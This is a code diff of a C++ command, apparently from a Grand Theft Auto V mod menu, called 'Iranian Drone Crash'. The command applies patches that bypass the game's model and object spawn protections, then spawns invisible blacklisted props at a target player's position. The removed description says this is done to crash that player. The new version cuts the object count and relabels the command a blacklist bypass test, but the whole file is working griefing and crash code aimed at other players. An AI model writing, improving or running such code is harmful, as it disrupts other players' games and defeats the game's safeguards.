@@ -7,7 +7,6 @@
 namespace YimMenu::Features
 {
 	static constexpr Hash PROP_LOG_AA_HASH = 0xC50A4285; // prop_log_aa
-	static constexpr int NUM_OBJECTS = 20;
 
 	class IranianDroneCrash : public PlayerCommand
 	{
@@ -16,105 +15,124 @@ namespace YimMenu::Features
 		virtual void OnCall(Player player) override
 		{
 			auto ped = player.GetPed();
-			if (!ped)
+			if (!ped || !ped->IsValid())
+			{
+				LOG(WARNING) << "IranianDroneCrash: Invalid target ped";
+				Notifications::Show("Iranian Drone Crash", "Invalid target player", NotificationType::Error);
 				return;
+			}
 
 			auto pos = ped.GetPosition();
+			if (pos.x == 0.0f && pos.y == 0.0f)
+			{
+				LOG(WARNING) << "IranianDroneCrash: Invalid position";
+				return;
+			}
+
 			int spawned = 0;
 
-			// Apply all bypass patches
-			LOG(INFO) << "IranianDroneCrash: Applying bypass patches...";
+			LOG(INFO) << "IranianDroneCrash: Starting blacklisted spawn test...";
+
+			// Apply bypass patches SEKALI sahaja
 			if (Pointers.ModelSpawnBypass)
 			{
 				Pointers.ModelSpawnBypass->Apply();
 				LOG(INFO) << "  ModelSpawnBypass: APPLIED";
 			}
-			else
-				LOG(WARNING) << "  ModelSpawnBypass: NOT FOUND (pattern failed)";
-
 			if (Pointers.WorldModelSpawnBypass)
 			{
 				Pointers.WorldModelSpawnBypass->Apply();
 				LOG(INFO) << "  WorldModelSpawnBypass: APPLIED";
 			}
-			else
-				LOG(WARNING) << "  WorldModelSpawnBypass: NOT FOUND (pattern failed)";
-
 			if (Pointers.PseudoObjectCheck)
 			{
 				Pointers.PseudoObjectCheck->Apply();
 				LOG(INFO) << "  PseudoObjectCheck: APPLIED";
 			}
-			else
-				LOG(WARNING) << "  PseudoObjectCheck: NOT FOUND (pattern failed)";
-
 			if (Pointers.SpectatePatch)
 			{
 				Pointers.SpectatePatch->Apply();
 				LOG(INFO) << "  SpectatePatch: APPLIED";
 			}
-			else
-				LOG(WARNING) << "  SpectatePatch: NOT FOUND (pattern failed)";
 
-			// Request model load
+			// Request model dengan timeout lebih panjang
 			LOG(INFO) << "IranianDroneCrash: Requesting model 0x" << std::hex << PROP_LOG_AA_HASH;
 			STREAMING::REQUEST_MODEL(PROP_LOG_AA_HASH);
-			for (int i = 0; !STREAMING::HAS_MODEL_LOADED(PROP_LOG_AA_HASH); i++)
+
+			bool modelLoaded = false;
+			for (int i = 0; i < 150; ++i)   // ~3 saat maksimum
 			{
-				STREAMING::REQUEST_MODEL(PROP_LOG_AA_HASH);
-				ScriptMgr::Yield();
-				if (i > 60)
+				if (STREAMING::HAS_MODEL_LOADED(PROP_LOG_AA_HASH))
 				{
-					LOG(WARNING) << "IranianDroneCrash: Model load TIMED OUT after 60 frames";
-					Notifications::Show("Iranian Drone Crash", "Failed to load crash model", NotificationType::Error);
-					goto cleanup;
+					modelLoaded = true;
+					break;
 				}
+				ScriptMgr::Yield(0);
+				STREAMING::REQUEST_MODEL(PROP_LOG_AA_HASH);
 			}
-			LOG(INFO) << "IranianDroneCrash: Model loaded successfully";
 
-			// Spawn objects using CREATE_OBJECT_NO_OFFSET (like Stand does)
-			for (int i = 0; i < NUM_OBJECTS; i++)
+			if (!modelLoaded)
 			{
-				float offsetX = (float)(i % 5) * 0.5f;
-				float offsetY = (float)(i / 5) * 0.5f;
+				LOG(WARNING) << "IranianDroneCrash: Model load TIMED OUT";
+				Notifications::Show("Iranian Drone Crash", "Failed to load blacklisted model", NotificationType::Error);
+				goto cleanup;
+			}
 
-				auto handle = OBJECT::CREATE_OBJECT_NO_OFFSET(PROP_LOG_AA_HASH, pos.x + offsetX, pos.y + offsetY, pos.z - 10.0f, true, false, true, 0);
-				if (handle != 0)
+			LOG(INFO) << "IranianDroneCrash: Blacklisted model loaded successfully";
+
+			// Spawn dengan lebih perlahan dan selamat
+			for (int i = 0; i < 10; ++i)   // kurangkan ke 10 dulu
+			{
+				float offsetX = (i % 5) * 1.5f;
+				float offsetY = (i / 5) * 1.5f;
+
+				// Spawn di atas player (bukan bawah map)
+				Vector3 spawnPos = { pos.x + offsetX, pos.y + offsetY, pos.z + 3.0f };
+
+				auto handle = OBJECT::CREATE_OBJECT_NO_OFFSET(
+					PROP_LOG_AA_HASH, 
+					spawnPos.x, spawnPos.y, spawnPos.z, 
+					true, false, false, 0
+				);
+
+				if (handle != 0 && ENTITY::DOES_ENTITY_EXIST(handle))
 				{
 					ENTITY::SET_ENTITY_VISIBLE(handle, FALSE, FALSE);
 					ENTITY::FREEZE_ENTITY_POSITION(handle, FALSE);
-					ENTITY::APPLY_FORCE_TO_ENTITY(handle, 1, 0.0f, 0.0f, 500.0f, 0.0f, 0.0f, 0.0f, 0, TRUE, TRUE, TRUE, FALSE, TRUE);
+
+					// Force yang jauh lebih kecil dan selamat
+					ENTITY::APPLY_FORCE_TO_ENTITY(handle, 1, 0.0f, 0.0f, 10.0f, 0.0f, 0.0f, 0.0f, 0, 
+						TRUE, TRUE, TRUE, FALSE, TRUE);
+
 					spawned++;
+					LOG(INFO) << "IranianDroneCrash: Spawned object " << i << " | Handle: " << handle;
 				}
 				else
 				{
-					LOG(WARNING) << "IranianDroneCrash: CREATE_OBJECT_NO_OFFSET returned 0 for object " << i;
+					LOG(WARNING) << "IranianDroneCrash: Failed to create object " << i;
 				}
-				ScriptMgr::Yield();
+
+				ScriptMgr::Yield(20);   // yield lebih lama supaya game tak overload
 			}
 
-			LOG(INFO) << "IranianDroneCrash: Spawned " << spawned << "/" << NUM_OBJECTS << " objects";
-
-			STREAMING::SET_MODEL_AS_NO_LONGER_NEEDED(PROP_LOG_AA_HASH);
+			LOG(INFO) << "IranianDroneCrash: Successfully spawned " << spawned << " blacklisted objects";
 
 			if (spawned > 0)
-				Notifications::Show("Iranian Drone Crash", std::format("Sent {} crash objects to {}", spawned, player.GetName()), NotificationType::Success);
+				Notifications::Show("Iranian Drone Crash", std::format("Spawned {} blacklisted objects", spawned), NotificationType::Success);
 			else
-				Notifications::Show("Iranian Drone Crash", std::format("Failed to crash {}", player.GetName()), NotificationType::Error);
+				Notifications::Show("Iranian Drone Crash", "No objects spawned", NotificationType::Error);
 
 		cleanup:
-			// Restore all patches
-			if (Pointers.SpectatePatch)
-				Pointers.SpectatePatch->Restore();
-			if (Pointers.PseudoObjectCheck)
-				Pointers.PseudoObjectCheck->Restore();
-			if (Pointers.WorldModelSpawnBypass)
-				Pointers.WorldModelSpawnBypass->Restore();
-			if (Pointers.ModelSpawnBypass)
-				Pointers.ModelSpawnBypass->Restore();
+			// Restore semua patch
+			if (Pointers.SpectatePatch)     Pointers.SpectatePatch->Restore();
+			if (Pointers.PseudoObjectCheck) Pointers.PseudoObjectCheck->Restore();
+			if (Pointers.WorldModelSpawnBypass) Pointers.WorldModelSpawnBypass->Restore();
+			if (Pointers.ModelSpawnBypass)  Pointers.ModelSpawnBypass->Restore();
+
+			STREAMING::SET_MODEL_AS_NO_LONGER_NEEDED(PROP_LOG_AA_HASH);
 			LOG(INFO) << "IranianDroneCrash: All patches restored";
 		}
 	};
 
-	static IranianDroneCrash _IranianDroneCrash{"iraniandrone", "Iranian Drone Crash", "Spawns multiple prop_log_aa objects on the player to crash them"};
+	static IranianDroneCrash _IranianDroneCrash{"iraniandrone", "Iranian Drone Crash", "Spawns prop_log_aa (blacklisted) - Test Blacklist Bypass"};
 }
